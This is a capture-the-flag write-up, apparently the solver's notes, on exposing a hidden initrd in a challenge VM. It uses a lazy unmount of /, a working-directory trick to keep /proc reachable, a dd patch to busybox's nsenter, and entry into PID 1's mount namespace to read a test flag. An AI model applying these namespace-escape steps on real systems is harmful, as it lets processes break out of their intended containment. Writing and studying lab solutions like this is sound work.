The challenge needs to expose the initrd. One potential way to find out the
solution, without reading all of the kernel sources, is:
  * Find the relevant
    [kernel documentation](https://github.com/torvalds/linux/blob/master/Documentation/filesystems/ramfs-rootfs-initramfs.rst)
  * See this thing is called rootfs
  * Google about it
  * Find https://unix.stackexchange.com/a/455136 (section "Can we prove that
    rootfs is still mounted?")
  * Test the main reproducer and see that it works on a normal computer

Alternatively, one could find how the initrd was hidden:
  * [prepare_namespace](https://elixir.bootlin.com/linux/v5.12.14/C/ident/prepare_namespace)
  * a mount followed by a chroot, need to undo that
  * undo mount = lazy unmount, so need a chroot escape
  * see [set_fs_root](https://elixir.bootlin.com/linux/v5.12.14/source/fs/init.c#L76)
  * xref https://elixir.bootlin.com/linux/v5.12.14/C/ident/set_fs_root, containing:
    * init_chroot
    * init_mount_tree
    * new mount namespace via clone / unshare
    * chroot
    * setns
  * analyse:
    * init_chroot and init_mount_tree are called at most once during init
    * chroot syscall uses a string path so a chicken-and-egg problem
  * it's either setns or clone / unshare, can be dealt with by elimination.

So after knowing the exploit:
  * Either get the payload inside the remote VM, or do it with busybox:
    * Unmount part is easy, the problem is that to setns we don't have
      `/proc` anymore and it cannot be mounted again on this detached fs:

```
/ # mount
/dev/root on / type ext4 (rw,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
devtmpfs on /dev type devtmpfs (...)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
sys on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
/ # umount -l /
/ # nsenter -t 1 -m
nsenter: can't open '/proc/1/ns/mnt': No such file or directory
/ # mount
mount: no /proc/mounts
/ # ls /proc
/ # mount -t proc proc proc
mount: mounting proc on proc failed: Invalid argument
```

    * How to keep proc alive? Well, umount detach won't destroy cwd, so we
      have access to proc from cwd, but nsenter wants to use absolute paths:

```
/ # cd /proc
/proc # umount -l /
sh: getcwd: No such file or directory
(unknown) # ls
[...]
(unknown) # nsenter -t 1 -m
nsenter: can't open '/proc/1/ns/mnt': No such file or directory
sh: getcwd: No such file or directory
(unknown) # ls /proc
sh: getcwd: No such file or directory
(unknown) # ls /
bin         dev         etc         linuxrc     lost+found  proc        sbin        sys         tmp         usr
sh: getcwd: No such file or directory
```

    * We can patch busybox! Buxybox's nsenter is at
      [nsenter.c](https://elixir.bootlin.com/busybox/1.33.1/source/util-linux/nsenter.c#L147),
      and a quick look should find the format string it uses, so:

```
/ # strings -t d /bin/busybox | grep '/proc/%u/%s'
1102911 /proc/%u/%s
/ # echo -ne './%u/%s\0' | dd of=/bin/busybox obs=1 seek=1102911 conv=notrunc
dd: can't open '/bin/busybox': Text file busy
```

    * Oh, just need a copy so it's a separate inode:

```
/ # cp /bin/busybox /bin/busybox.new
mv /bin/busybox.new /bin/busybox
cd /proc
umount -l /
nsenter -t 1 -m busybox ash/ # echo -ne './%u/%s\0' | dd of=/bin/busybox.new obs=1 seek=1102911 conv=notrunc
0+1 records in
8+0 records out
8 bytes (8B) copied, 0.000589 seconds, 13.3KB/s
/ # mv /bin/busybox.new /bin/busybox
/ # cd /proc
/proc # umount -l /
sh: getcwd: No such file or directory
(unknown) # nsenter -t 1 -m
nsenter: can't execute '/bin/sh': No such file or directory
sh: getcwd: No such file or directory
```

    * Oh did we succeed? Yes, `/flag` now exists:

```
(unknown) # nsenter -t 1 -m /flag
nsenter: can't execute '/flag': Permission denied
sh: getcwd: No such file or directory
```

    * The question now is  to see the flag. Unfortunately, `setns(2)` syscall
      [destroys cwd](https://elixir.bootlin.com/linux/v5.12.14/source/kernel/nsproxy.c#L509),
      so we can't use this cwd trick anymore, and unless can utilize fds, or
      we are a binary that is still running, we are limited to initrd now. Fortunately we have busybox in initrd so:

```
(unknown) # nsenter -t 1 -m busybox ash
/ # busybox cat /flag
CTF{TestFlag}
```

    * For extra fun, yeah rootfs is real:

```
/ # busybox mkdir proc
/ # busybox mount -n -t proc -o nosuid,noexec,nodev proc /proc
/ # busybox mount
none on / type rootfs (rw)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
```
